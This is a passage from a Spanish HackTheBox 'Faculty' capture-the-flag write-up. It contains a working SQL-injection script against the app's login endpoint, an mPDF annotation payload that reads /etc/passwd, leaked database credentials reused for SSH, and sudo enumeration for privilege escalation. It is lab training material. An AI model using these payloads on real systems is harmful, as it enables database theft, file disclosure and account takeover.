    <span class="k">return</span> <span class="s">"""' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema = "{}"-- -"""</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">database</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_columns</span><span class="p">(</span><span class="n">table</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">"""' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, column_name, 0x7c) from information_schema.columns where table_name = "{}"-- -"""</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">table</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_fields</span><span class="p">(</span><span class="n">column</span><span class="p">,</span> <span class="n">table</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">"""' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, {}, 0x7c) from {}-- -"""</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">column</span><span class="p">,</span> <span class="n">table</span><span class="p">)</span>
 
<span class="k">def</span> <span class="nf">get_info</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">"""' union select 1,2,3,4,5,6,7,8,9,group_concat(0x7c, {}, 0x7c)-- -"""</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
    

<span class="c1"># options
</span>
<span class="k">def</span> <span class="nf">options</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">get_databases</span><span class="p">()</span>
        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">database</span> <span class="ow">and</span> <span class="n">args</span><span class="p">.</span><span class="n">table</span> <span class="ow">and</span> <span class="n">args</span><span class="p">.</span><span class="n">column</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">get_fields</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">column</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">table</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">database</span> <span class="ow">and</span> <span class="n">args</span><span class="p">.</span><span class="n">table</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">get_columns</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">table</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">database</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">get_tables</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">database</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">query</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">get_info</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">query</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>

<span class="c1"># request
</span>
<span class="k">def</span> <span class="nf">inyection</span><span class="p">():</span>
    <span class="c1"># create session
</span>    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span> <span class="p">:</span> <span class="s">'application/x-www-form-urlencoded; charset=UTF-8'</span><span class="p">}</span>
    
    <span class="c1"># set option
</span>    <span class="n">inyection</span> <span class="o">=</span> <span class="n">options</span><span class="p">()</span>

    <span class="c1"># inyection
</span>    <span class="n">data</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">id_no</span><span class="o">=</span><span class="n">inyection</span><span class="p">)</span>
    <span class="n">target</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s">'/admin/ajax.php?action=login_faculty'</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">target</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s">'/index.php'</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get_dict</span><span class="p">())</span> 
    <span class="n">content</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
    
    <span class="c1"># encode b64
</span>    <span class="n">msg_b</span> <span class="o">=</span> <span class="n">content</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span>
    <span class="n">base64_b</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">msg_b</span><span class="p">)</span>
    <span class="n">base64_m</span> <span class="o">=</span> <span class="n">base64_b</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span>
    
    <span class="c1"># filter content
</span>    <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""echo </span><span class="si">{</span><span class="n">base64_m</span><span class="si">}</span><span class="s"> | base64 -d"""</span> <span class="o">+</span> <span class="s">""" | grep -E "&lt;a" | head -n 1 | awk -F'&gt;' '{print $2}' | awk '{print $1}'"""</span>
    <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">print</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="n">stdout</span><span class="p">)</span>
    
    

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">inyection</span><span class="p">()</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tool_Faculty/sql_inyection.py">https://github.com/E1P0TR0</a></p></div></blockquote><p>Despu√©s de enumerar las diversas tablas solo encontramos un <strong>hash</strong> del usuario <strong>Admin</strong> que no podremos crackear, a pesar de eso me gust√≥ el scripting de la inyecci√≥n a manera de pr√°ctica</p><p>Algo que si nos puede ser √∫til es la ruta que encontramos al encontrar el error de la inyecci√≥n: <code class="language-plaintext highlighter-rouge">/var/www/scheduling/admin/admin_class.php</code></p><p>Como usuarios de <code class="language-plaintext highlighter-rouge">Linux</code> sabemos que al montar un servidor web todos los archivos o documentos ser√°n almacenados en la ruta <em>/var/www/html</em> y podemos tener m√∫ltiples sitios web con una misma direcci√≥n IP, ya sea con <code class="language-plaintext highlighter-rouge">apache</code> (virtual hosts) o <code class="language-plaintext highlighter-rouge">nginx</code> (server blocks), y sus diferentes directorios de la web</p><p>Con lo anterior llegamos a la conclusi√≥n que <em>/var/www/scheduling</em> (nombre que tiene relaci√≥n con la web) sea un <strong>server block</strong> de <code class="language-plaintext highlighter-rouge">nginx</code> y <em>/admin</em> una posible ruta con sus respectivos archivos. As√≠ que ingresamos a la ruta <em>http://faculty.htb/admin</em> y nos redirigimos a otro panel <em>login.php</em>:</p><p><img data-src="/assets/img/htb/writeups/faculty/http_admin_login.png" alt="HTTPWeb" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Tambi√©n podemos realizar <strong>Fuzzing de directorios</strong> con <code class="language-plaintext highlighter-rouge">gobuster dir</code> para encontrar dicha ruta</p></div></blockquote><p>Ejecutando es script anterior encontramos que en la base de datos exist√≠a una tabla <strong>users</strong> y con solo un √∫nico usuario <strong>admin</strong>, pero no sin poder crackear la contrase√±a:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="go">‚ùØ python3 ../scripts/sql_inyection.py -d scheduling_db -t users

|id|,|name|,|password|,|type|,|username|

‚ùØ python3 ../scripts/sql_inyection.py -d scheduling_db -t users -c username

|admin|

‚ùØ python3 ../scripts/sql_inyection.py -d scheduling_db -t users -c password

|1fecbe762af147c1176a0fc2c722a345|
</span></pre></table></code></div></div><p>A pesar de eso, es probable que este panel de login tambi√©n sea vulnerable a <strong>SQL Inyection</strong>, ya que ambas forman parte de la misma web y probablemente apliquen las mismas pr√°cticas para la validaci√≥n de datos en la consulta a su base de datos</p><p>Estamos en lo correcto y logramos entrar como el usuario que antes habiamos validado en la table <strong>users</strong>:</p><p><img data-src="/assets/img/htb/writeups/faculty/http_home_page.png" alt="HTTPWeb" class="shadow" data-proofer-ignore></p><p>Ya dentro encontramos la relaci√≥n del panel de la izquierda con las tablas de la base de datos <strong>scheduling_db</strong> que vimos anteriormente</p><p>Despu√©s de toquetear la p√°gina, encontramos que todos los campos de entrada para el usuario son vulnerables a <strong>XSS (Cross Site Scripting)</strong>, pero no conseguimos explotarla del todo:</p><p><img data-src="/assets/img/htb/writeups/faculty/http_xss_vuln.png" alt="HTTPWeb" class="shadow" data-proofer-ignore></p><p>Lo que llama la atenci√≥n es que en la mayor√≠a de secciones podemos convertir la tabla de datos en <code class="language-plaintext highlighter-rouge">pdf</code> y con ello ver informaci√≥n interesante:</p><blockquote><p>Al convertir se nos abre una nueva pesta√±a con una ruta interesante: <em>http://faculty.htb/mpdf/tmp/OKi3s9CQdwfjGag64Ju5ZO0NpF.pdf</em></p></blockquote><blockquote><p>Tambi√©n al abrir las herramientas de desarrollador observamos el mensaje en consola: <em>PDF da3749fcbe722bed51f217ce14055d41 [1.4 mPDF 6.0 / -] (PDF.js: 2.12.70)</em></p></blockquote><p>Adem√°s podemos ver su c√≥digo que lo ejecuta en el archivo <code class="language-plaintext highlighter-rouge">viewer.js</code></p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="c1">//...</span>

<span class="k">async</span> <span class="nx">_initializeMetadata</span><span class="p">(</span><span class="nx">pdfDocument</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="p">{</span>
      <span class="nx">info</span><span class="p">,</span>
      <span class="nx">metadata</span><span class="p">,</span>
      <span class="nx">contentDispositionFilename</span><span class="p">,</span>
      <span class="nx">contentLength</span>
    <span class="p">}</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">pdfDocument</span><span class="p">.</span><span class="nx">getMetadata</span><span class="p">();</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">pdfDocument</span> <span class="o">!==</span> <span class="k">this</span><span class="p">.</span><span class="nx">pdfDocument</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">this</span><span class="p">.</span><span class="nx">documentInfo</span> <span class="o">=</span> <span class="nx">info</span><span class="p">;</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">metadata</span> <span class="o">=</span> <span class="nx">metadata</span><span class="p">;</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">_contentDispositionFilename</span> <span class="p">??</span><span class="o">=</span> <span class="nx">contentDispositionFilename</span><span class="p">;</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">_contentLength</span> <span class="p">??</span><span class="o">=</span> <span class="nx">contentLength</span><span class="p">;</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`PDF </span><span class="p">${</span><span class="nx">pdfDocument</span><span class="p">.</span><span class="nx">fingerprints</span><span class="p">[</span><span class="mi">0</span><span class="p">]}</span><span class="s2"> [</span><span class="p">${</span><span class="nx">info</span><span class="p">.</span><span class="nx">PDFFormatVersion</span><span class="p">}</span><span class="s2"> `</span> <span class="o">+</span> <span class="s2">`</span><span class="p">${(</span><span class="nx">info</span><span class="p">.</span><span class="nx">Producer</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">-</span><span class="dl">"</span><span class="p">).</span><span class="nx">trim</span><span class="p">()}</span><span class="s2"> / </span><span class="p">${(</span><span class="nx">info</span><span class="p">.</span><span class="nx">Creator</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">-</span><span class="dl">"</span><span class="p">).</span><span class="nx">trim</span><span class="p">()}</span><span class="s2">] `</span> <span class="o">+</span> <span class="s2">`(PDF.js: </span><span class="p">${</span><span class="nx">_pdfjsLib</span><span class="p">.</span><span class="nx">version</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">-</span><span class="dl">"</span><span class="p">}</span><span class="s2">)`</span><span class="p">);</span> <span class="c1">// This!</span>

<span class="c1">//...</span>
<span class="p">}</span>
</pre></table></code></div></div><blockquote><p>Y finalmente al descargar el pdf y abrirlo, en sus propiedades podemos ver la herramienta que se encargar√≠a de generar el archivo:</p></blockquote><p><img data-src="/assets/img/htb/writeups/faculty/mpdf_version.png" alt="mpdf" class="shadow" data-proofer-ignore></p><p>Buscando en internet encontramos que <strong>mpdf</strong> es una librer√≠a en <strong>PHP</strong> que permite generar archivos <strong>pdf</strong> usando <strong>html</strong>, adem√°s que su versi√≥n hasta la fecha es <code class="language-plaintext highlighter-rouge">mpdf 8.1.0</code> y la que usa es servidor la <code class="language-plaintext highlighter-rouge">mpdf 6.0</code>, por lo cu√°l est√° muy desactualizada y es probable que sea vulnerable</p><p>Encontramos en la p√°gina <a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf">Hacktricks</a> una posible brecha de <strong>Server Side XSS</strong>, lo c√∫al ya descubrimos anteriormente que la web era vulnerable a <strong>XSS (Cross Site Scripting)</strong></p><p>Depu√©s de intentar con varios tags para <strong>leer archivos locales</strong>, encontramos que <code class="language-plaintext highlighter-rouge">&lt;annotation&gt;</code> es vulnerable, pero que nos permite este tag?</p><p><img data-src="/assets/img/htb/writeups/faculty/annotation_tag.png" alt="AnnotationTAG" class="shadow" data-proofer-ignore></p><p>Como su mismo nombre lo dice nos permite realizar anotaciones en nuestro documento pdf, como las nostas <strong>Post-it</strong> que las personas usan</p><p>Ahora analizemos los par√°metros que usamos para la inyecci√≥n:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;annotation</span> <span class="na">file=</span><span class="s">"/etc/passwd"</span> <span class="na">content=</span><span class="s">"/etc/passwd"</span> <span class="na">icon=</span><span class="s">"Graph"</span> <span class="na">title=</span><span class="s">"Attached File: /etc/passwd"</span> <span class="na">pos-x=</span><span class="s">"195"</span> <span class="nt">/&gt;</span>
</pre></table></code></div></div><blockquote><p>Parameters</p><p>file : Ruta del archivo para adjuntar en el pdf (importante)</p><p>content : Texto emergente al pasar el cursor por el documento (importante para poder luego descargar el archivo)</p><p>icon : Apariencia del marcador de anotaci√≥n (no necesario)</p><p>tittle : Agregar un titulo a la nota (solo necesario para mejor visualizaci√≥n)</p><p>pos-x : Posici√≥n de la nota (tener en cuenta que se encuentre en el limite del tama√±o de tu archivo para poder visualizarlo, de igual manera estar√° adjunto al documento)</p></blockquote><blockquote class="prompt-tip"><div><p>En cualquier caso no puedas ver el archivo en la web, ten en cuenta que ya es parte del archivo y puedes extraerlo con la herramienta <a href="https://etutorials.org/Linux+systems/pdf+hacks/Chapter+1.+Consuming+PDF/Hack+12+Unpack+PDF+Attachments+Even+Without+Acrobat/">pdftk</a></p></div></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">‚ùØ apt install pdftk

‚ùØ pdftk OKbvFO0p8W9ud7qtnTzHJsfZhr.pdf unpack_files

‚ùØ ls
ÔáÅ OKbvFO0p8W9ud7qtnTzHJsfZhr.pdf  ÔÄñ passwd
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>M√°s informaci√≥n del tag <code class="language-plaintext highlighter-rouge">&lt;annotation&gt;</code> <a href="https://mpdf.github.io/reference/html-control-tags/annotation.html">https://mpdf.github.io</a></p></div></blockquote><blockquote class="prompt-tip"><div><p>Aqu√≠ puedes encontrar el repositorio de la vulnerabilidad exacta <a href="https://github.com/mpdf/mpdf/issues/356">https://github.com/mpdf</a></p></div></blockquote><p>Ahora que podemos leer archivos del sistema y tenemos el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, podemos ver los usuarios existentes:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="go">‚ùØ cat passwd | grep bash
root:x:0:0:root:/root:/bin/bash
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
developer:x:1001:1002:,,,:/home/developer:/bin/bash
</span></pre></table></code></div></div><p>Intentamos leer llaves privadas <strong>RSA</strong> pero no conseguimos nada. Entonces recordamos el archivo que encontramos antes al generar el error en la inyecci√≥n <strong>SQL</strong> (<em>/var/www/scheduling/admin/admin_class.php</em>), lo extraemos y vemos su contenido:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'display_errors'</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="kd">Class</span> <span class="nc">Action</span> <span class="p">{</span>
        <span class="k">private</span> <span class="nv">$db</span><span class="p">;</span>

        <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
                <span class="nb">ob_start</span><span class="p">();</span>
        <span class="k">include</span> <span class="s1">'db_connect.php'</span><span class="p">;</span> <span class="c1">// File in the same directory</span>
    
    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span> <span class="o">=</span> <span class="nv">$conn</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
            <span class="nb">ob_end_flush</span><span class="p">();</span>
        <span class="p">}</span>

<span class="c1">//...</span>
</pre></table></code></div></div><blockquote class="prompt-warning"><div><p>Encontramos las funciones y queries vulnerables a la <strong>Inyecci√≥n SQL</strong> y nos demos cuenta que el problema es el <strong>mal uso de concatenaci√≥n de cadenas</strong> (‚Äú.‚Äù para php)</p></div></blockquote><p>Lo que s√≠ de ve interesante es que incluyen el archivo <code class="language-plaintext highlighter-rouge">db_connect.php</code>, que por su nombre podemos encontrar cosas interesantes de la base de datos, as√≠ que de la misma manera descargamos el archivo:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> 

<span class="nv">$conn</span><span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="s1">'localhost'</span><span class="p">,</span><span class="s1">'sched'</span><span class="p">,</span><span class="s1">'Co.met06aci.dly53ro.per'</span><span class="p">,</span><span class="s1">'scheduling_db'</span><span class="p">)</span><span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Could not connect to mysql"</span><span class="mf">.</span><span class="nf">mysqli_error</span><span class="p">(</span><span class="nv">$con</span><span class="p">));</span> <span class="c1">// Credentials!</span>
</pre></table></code></div></div><p>Logramos encontrar unas credenciales, pero en nuestro escaneo de puertos la m√°quina no tenia el puerto por defecto de Mysql <strong>3306</strong> as√≠ que no podemos conectarnos. Pero ya que son credenciales podemos rehusarlas e ingresar como los usuarios disponibles del sistema que vimos en el archivo <em>/etc/passwd</em> y tienen una bash: <strong>root, gbyolo, developer</strong></p><p>Al final logramos entrar como el usuario <code class="language-plaintext highlighter-rouge">gbyolo</code> pero no tenemos permisos a√∫n para ver la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="go">‚ùØ ssh gbyolo@10.10.11.169
gbyolo@10.10.11.169's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Aug  5 20:20:15 CEST 2022

  System load:  0.0               Processes:             226
  Usage of /:   74.9% of 4.67GB   Users logged in:       0
  Memory usage: 35%               IPv4 address for eth0: 10.10.11.169
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Fri Aug  5 20:19:01 2022 from 10.10.14.76
</span><span class="gp">gbyolo@faculty:~$</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">gbyolo
</span><span class="gp">gbyolo@faculty:~$</span><span class="w"> </span>find / <span class="nt">-name</span> user.txt 2&gt;/dev/null | <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">total 0
</span></pre></table></code></div></div><p>Empezamos una enumeraci√≥n b√°sica del sistema y encontramos en la ruta <code class="language-plaintext highlighter-rouge">/var/mail</code> un mensaje del usuario <code class="language-plaintext highlighter-rouge">developer</code> para <code class="language-plaintext highlighter-rouge">gbyolo</code> que nos dice que ahora podemos administrar los repositorios <strong>git</strong> de la facultad</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="gp">gbyolo@faculty:/$</span><span class="w"> </span><span class="nb">cat</span> /var/mail/gbyolo 
<span class="go">From developer@faculty.htb  Tue Nov 10 15:03:02 2020
</span><span class="gp">Return-Path: &lt;developer@faculty.htb&gt;</span><span class="w">
</span><span class="go">X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb (Postfix, from userid 1001)
</span><span class="gp">        id 0399E26125A;</span><span class="w"> </span>Tue, 10 Nov 2020 15:03:02 +0100 <span class="o">(</span>CET<span class="o">)</span>
<span class="go">Subject: Faculty group
</span><span class="gp">To: &lt;gbyolo@faculty.htb&gt;</span><span class="w">
</span><span class="go">X-Mailer: mail (GNU Mailutils 3.7)
</span><span class="gp">Message-Id: &lt;20201110140302.0399E26125A@faculty.htb&gt;</span><span class="w">
</span><span class="go">Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET)
From: developer@faculty.htb
X-IMAPbase: 1605016995 2
Status: O
X-UID: 1

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb
</span></pre></table></code></div></div><p>Para esto podemos ver que aplicaciones o comandos podemos ejecutar y que privilegios tenemos, para ello usamos el comando <code class="language-plaintext highlighter-rouge">sudo -l</code> e ingresamos nuestra contrase√±a (la de la conexi√≥n ssh):</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">gbyolo@faculty:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
</span></pre></table></code></div></div><p>Encontramos que podemos ejecutar el comando <code class="language-plaintext highlighter-rouge">meta-git</code> como el usuario <code class="language-plaintext highlighter-rouge">developer</code>, por el nombre podemos decir que es un control de versiones al igual que <code class="language-plaintext highlighter-rouge">git</code></p><p>Investigando primero encontramos que <code class="language-plaintext highlighter-rouge">meta</code> es una herramienta para administrar sistemas y bibliotecas de m√∫ltiples proyectos y que <code class="language-plaintext highlighter-rouge">meta-git</code> es un plugin que permite administrar estos repositorios meta</p><blockquote class="prompt-info"><div><p>Por si necesitas mas informaci√≥n sobre qu√© es <a href="https://github.com/mateodelnorte/meta">meta</a> y <a href="https://www.npmjs.com/package/meta-git">meta-git</a></p></div></blockquote><p>Executando el programa nos muestra todas las opciones que tenemos disponibles:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="gp">gbyolo@faculty:~$</span><span class="w"> </span>/usr/local/bin/meta-git
<span class="go">Usage: meta-git [options] [command]

Options:
  -h, --help  output usage information

Commands:
  add         Add file contents to the index
  branch      List, create, or delete branches
  checkout    Switch branches or restore working tree files
  clean       Remove untracked files from the working tree
  clone       Clone meta and child repositories into new directories
  commit      Record changes to the repository
  diff        Show changes between commits, commit and working tree, etc
  fetch       Download objects and refs from another repository
  merge       Join two or more development histories together
  pull        Fetch from and integrate with another repository or a local branch
  push        Update remote refs along with associated objects
  remote      Manage set of tracked repositories
  status      Show the working tree status
  tag         Create, list, delete or verify a tag object signed with GPG
  update      Clone any repos that exist in your .meta file but aren't cloned locally
  help [cmd]  display help for [cmd]
</span></pre></table></code></div></div><p>A pesar que no podemos ver la versi√≥n del programa en el panel de ayuda, ya que es una aplicaci√≥n hecha en javascript y necesita instalarse con <code class="language-plaintext highlighter-rouge">npm</code> (sistema de gesti√≥n de paquetes). Entonces al momento de instalar este paquete/plugin se crea un directorio <em>/node-modules</em> en la carpeta ra√≠z de nuestro proyecto <em>/usr/local/lib/node_modules/meta-git</em> y en est√° carpeta encontramos el archivo <em>package.json</em> donde se almacenan todos los nombres y versiones de los paquetes que depende, con ello encontramos las version de <code class="language-plaintext highlighter-rouge">meta-git</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="gp">gbyolo@faculty:/$</span><span class="w"> </span>find / <span class="nt">-name</span> meta-git 2&gt;/dev/null                                                                                                                  <span class="o">[</span>65/65]
